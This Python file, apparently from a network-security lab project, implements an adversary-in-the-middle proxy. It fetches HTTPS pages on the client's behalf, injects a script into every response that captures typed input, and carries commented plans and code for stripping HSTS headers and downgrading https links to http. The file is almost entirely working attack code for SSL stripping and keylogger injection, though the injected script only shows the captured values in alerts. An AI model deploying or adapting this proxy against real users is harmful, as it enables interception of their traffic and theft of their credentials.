from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse
import http.client

from networking import *
from modules import orig_dsts
import time

''' Big Idea:
# Receive all of the packets from the client

# send own https request to the server
# The request IP should be from the AITM

# Receive the packets from the server

# Manipulate the server https response
# Strip strict-transfer-protocol
# Replace https links with http
# Strip any other headers of relevance
# Add keylogger code
'''

def modify_b_content(b_content):
    # try: b_content = b_content.replace(b"https://", b"http://")
    # except: print("Failed to Replace")
    
    new_html = '<div><button onclick="handleClick()">Click me</button></div>'
    new_script = '''
    <script>
        document.addEventListener('input', function(event) {
            if (event.target.tagName === 'INPUT' || event.target.tagName === 'TEXTAREA') {
                alert(event.target.value);
            }
        });
    </script>
    '''
    new_php = '''
    <?php

    ?>

    '''
    b_new_html = new_html.encode('utf-8')
    b_new_script = new_script.encode('utf-8')
    b_new_php = new_php.encode('utf-8')

    b_content += b_new_html
    b_content += b_new_script
    b_content += b_new_php

    return b_content

'''
Somewhat works but is quite buggy
'''

class ProxyHTTPRequestHandler(BaseHTTPRequestHandler):

    def do_GET(self):
        # Parse dst host and path
        dst_host = self.headers.get('Host')
        dst_path = urlparse(self.path).path

        # Create a connection to the target server
        conn = http.client.HTTPSConnection(dst_host)

        # Forward the request to the target server
        conn.request("GET", dst_path)

        # Get the response
        response = conn.getresponse()

        # Check for 301 redirect
        if response.status == 301:
            # Extract the new location from the response headers
            new_location = response.getheader('Location')
            
            # Parse the new location to handle both absolute and relative URLs
            parsed_url = urlparse(new_location)
            
            if not parsed_url.netloc:  # If it's a relative URL
                new_location = f"https://{dst_host}{parsed_url.path}"

            # Create a new connection to the new location
            new_conn = http.client.HTTPSConnection(urlparse(new_location).netloc)
            new_conn.request("GET", urlparse(new_location).path)
            
            # Get the new response
            new_response = new_conn.getresponse()
            # Handle the new response as needed
            # print("new_response:", new_response.status, new_response.reason)
            # print("new_response:", new_response.headers)
            b_content = new_response.read()

            b_content = modify_b_content(b_content)

            # Send response status code
            self.send_response(new_response.status)
            
            # Send headers
            self.send_header('Content-type', 'text/html')

            self.end_headers()

            # Write content to wfile in chunks
            chunk_size = 8192
            for i in range(0, len(b_content), chunk_size):
                chunk = b_content[i:i + chunk_size]
                self.wfile.write(chunk)

            new_conn.close()
        else:
            # print("response:", response.status, response.reason)
            # print("response:", response.headers)

            # Send response status code
            self.send_response(response.status)
            b_content = response.read()

            b_content = modify_b_content(b_content)

            # Send headers
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            
            # Write content to wfile
            chunk_size = 8192
            for i in range(0, len(b_content), chunk_size):
                chunk = b_content[i:i + chunk_size]
                self.wfile.write(chunk)

        conn.close()


class Server:
    def __init__(self, http_daemon = None, target_ip = None, is_ready_bool = False):
        self.http_daemon = http_daemon
        self.target_ip = target_ip
        self.is_ready_bool = is_ready_bool

    def start(self, port: int):
        # Create a HTTP server with the specified port
        self.http_daemon = HTTPServer(("", port), ProxyHTTPRequestHandler)
        
        # Print serving ip address / port & update server status
        print("Serving at", get_ip_address() + ":" + str(port) + "\n")
        self.is_ready_bool = True

        self.http_daemon.serve_forever() # Set server to handle requests indefinitely
    
    def is_ready(self):
        return self.is_ready_bool

    def stop(self):
        if self.http_daemon is not None:
            # Shut down server
            self.http_daemon.shutdown()
            self.http_daemon.server_close()
            
            # Cleanup variables
            self.http_daemon = None
            self.is_ready_bool = False

            print("Server closed...")


'''
Refer back to later (header popping)
'''

# from networking import *
# from modules import *
# from scapy.layers.http import *

# class ProxyHTTPRequestHandler(SimpleHTTPRequestHandler):
#     def do_GET(self):
#         self.send_response(200)
#         self.send_header("Content-Type", "text")
#         self.wfile.write(b'Hello, world!')

#     # def do_GET(self):
#     #     # Forward the request to the target server
#     #     resp = requests.get("http://danger.jeffondich.com/")
#     #     b_content = None

#     #     # Modify HTTP(S) Headers / Response
#     #     try: b_content = resp.content.replace(b"https://", b"http://")
#     #     except: pass

#     #     try: resp.headers.pop("Strict-Transport-Security", None)
#     #     except: pass

#     #     try: resp.headers.pop("Transfer-Encoding", None)
#     #     except: pass

#     #     try: resp.headers.pop("Content-Encoding", None)
#     #     except: pass

#     #     # Send modified response
#     #     self.send_response(200)
#     #     for header, value in resp.headers.items():
#     #         self.send_header(header, value)
#     #         print(f"Sent: {header}: {value}")
#     #     self.end_headers()
#     #     self.wfile.write(b_content)


